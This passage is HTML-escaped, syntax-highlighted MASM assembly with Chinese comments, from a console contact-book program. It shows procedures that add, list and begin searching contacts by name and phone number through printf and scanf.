&lt;span class=&quot;nx&quot;&gt;szDelSuccess&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;删除成功！&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;szModify&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;请输入要修改联系人的姓名：&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;szModifySuccess&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;修改成功！&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;szInputNewName&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;请输入新的联系人姓名：&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;szInputNewNum&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;请输入新的联系人电话：&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;str_printf_size&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;超出容量&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ah&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;str_format_str&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt;		&lt;span class=&quot;s2&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;str_format_int&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt;		&lt;span class=&quot;s2&quot;&gt;&quot; %c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;此处前面加一个空格&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;用于把换行符吃掉&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;输出联系人信息&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;str_show_content&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;%d: %-7s %-7s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ah&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;stdOutHandle&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;HANDLE&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;标准输出设备句柄&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;stdInHandle&lt;/span&gt;		&lt;span class=&quot;nx&quot;&gt;HANDLE&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;byteWritten&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;输出字节数&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;bytesRead&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;控制台标题&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;INVOKE&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SetConsoleTitle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ADDR&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;titleStr&lt;/span&gt;


&lt;span class=&quot;nx&quot;&gt;AddData&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取当前已存放的个数&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;判断是否大于容量&lt;/span&gt;
		
		&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;max_count&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;如果超出了&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;就报错&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size_error&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt;

		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;打印提示&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;因为&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;会修改&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;和&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;的值&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;所以需要进行保存&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szInputName&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;

		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;接收用户的输入&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取结构体的大小&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;计算偏移&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;imul&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取数组首地址&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TeleContacts&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;计算对应下标元素的首地址&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;

		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取联系人&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_format_str&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_scanf&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;

		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;打印提示&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;因为&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;会修改&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;和&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;的值&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;所以需要进行保存&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szInputNum&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;

		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取联系人电话&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_format_str&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_scanf&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;平栈&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;

		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;自增计数器&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ret_addr&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;size_error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_printf_size&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;ret_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;AddData&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endp&lt;/span&gt;


&lt;span class=&quot;nx&quot;&gt;ShowData&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;打印分割符&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szFenGe&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取结构体的大小&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;计算偏移&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;imul&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取数组首地址&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TeleContacts&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;计算对应下标元素的首地址&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;

		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;打印所有联系人信息&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;保存原始&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_show_content&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;恢复&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;

		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;自增下标&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;endw&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;打印分割符&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szFenGe&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;ShowData&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endp&lt;/span&gt;


&lt;span class=&quot;nx&quot;&gt;FindData&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;提示输入查找的姓名&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szFind&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取输入的用户名&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_format_str&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_scanf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;

